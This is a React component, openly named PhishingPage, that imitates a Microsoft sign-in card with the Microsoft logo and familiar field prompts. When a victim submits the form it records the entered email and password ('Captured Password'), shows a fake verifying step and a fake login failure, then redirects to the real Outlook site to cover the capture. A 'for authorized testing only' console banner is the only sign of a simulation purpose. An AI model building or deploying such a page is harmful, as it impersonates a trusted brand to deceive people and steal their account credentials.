"use client";

import { useState, useEffect } from 'react';
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Label } from '@/components/ui/label';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { Loader2, AlertCircle } from 'lucide-react';

const MicrosoftLogo = () => (
  <svg width="21" height="21" viewBox="0 0 21 21" fill="none" xmlns="http://www.w3.org/2000/svg" className="mr-2">
    <path d="M9.83333 9.83333H0V0H9.83333V9.83333Z" fill="#F25022"/>
    <path d="M21 9.83333H11.1667V0H21V9.83333Z" fill="#7FBA00"/>
    <path d="M9.83333 21H0V11.1667H9.83333V21Z" fill="#00A4EF"/>
    <path d="M21 21H11.1667V11.1667H21V21Z" fill="#FFB900"/>
  </svg>
);

export function PhishingPage() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [status, setStatus] = useState<'idle' | 'verifying' | 'error'>('idle');

  useEffect(() => {
    if (status === 'error') {
      const timer = setTimeout(() => {
        window.location.href = 'https://outlook.live.com/';
      }, 3000);
      return () => clearTimeout(timer);
    }
  }, [status]);

  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!email || !password) return;

    setStatus('verifying');
    console.warn('--- FOR AUTHORIZED TESTING ONLY ---');
    console.log('Captured Username/Email:', email);
    console.log('Captured Password:', password);
    console.warn('---------------------------------');

    setTimeout(() => {
      setStatus('error');
    }, 2500);
  };

  const renderContent = () => {
    switch (status) {
      case 'verifying':
        return (
          <div className="flex flex-col items-center justify-center text-center h-48">
            <Loader2 className="h-8 w-8 animate-spin text-primary mb-4" />
            <p className="text-lg font-medium">Verifying...</p>
            <p className="text-sm text-muted-foreground">Please wait while we sign you in.</p>
          </div>
        );
      case 'error':
        return (
          <Alert variant="destructive" className="h-48 flex flex-col justify-center">
            <AlertCircle className="h-4 w-4" />
            <AlertTitle>Login Failed</AlertTitle>
            <AlertDescription>
              There was a problem with the service. Please try again later. You will be redirected shortly.
            </AlertDescription>
          </Alert>
        );
      case 'idle':
      default:
        return (
          <form onSubmit={handleSubmit}>
            <div className="grid gap-4">
              <div className="grid gap-2">
                <Input
                  id="email"
                  type="email"
                  placeholder="Email, phone, or Skype"
                  required
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="bg-background/80"
                />
              </div>
              <div className="grid gap-2">
                <Input
                  id="password"
                  type="password"
                  placeholder="Password"
                  required
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="bg-background/80"
                />
              </div>
              <div className="flex justify-end mt-4">
                <Button type="submit" disabled={status !== 'idle'}>
                  {status === 'verifying' ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : null}
                  Sign in
                </Button>
              </div>
            </div>
          </form>
        );
    }
  };

  return (
    <Card className="w-full max-w-sm shadow-2xl bg-card/90 backdrop-blur-sm border-2 border-border/20">
      <CardHeader className="p-6">
        <div className="flex items-center mb-2">
          <MicrosoftLogo />
          <span className="text-lg font-medium text-muted-foreground">Microsoft</span>
        </div>
        <CardTitle className="text-2xl font-semibold">Sign in</CardTitle>
      </CardHeader>
      <CardContent className="p-6 pt-0">
        {renderContent()}
      </CardContent>
      {status === 'idle' && (
         <CardFooter className="flex-col items-start p-6 pt-0 text-sm">
            <a href="#" className="text-primary hover:underline underline-offset-4 text-xs">
              Can't access your account?
            </a>
         </CardFooter>
      )}
    </Card>
  );
}
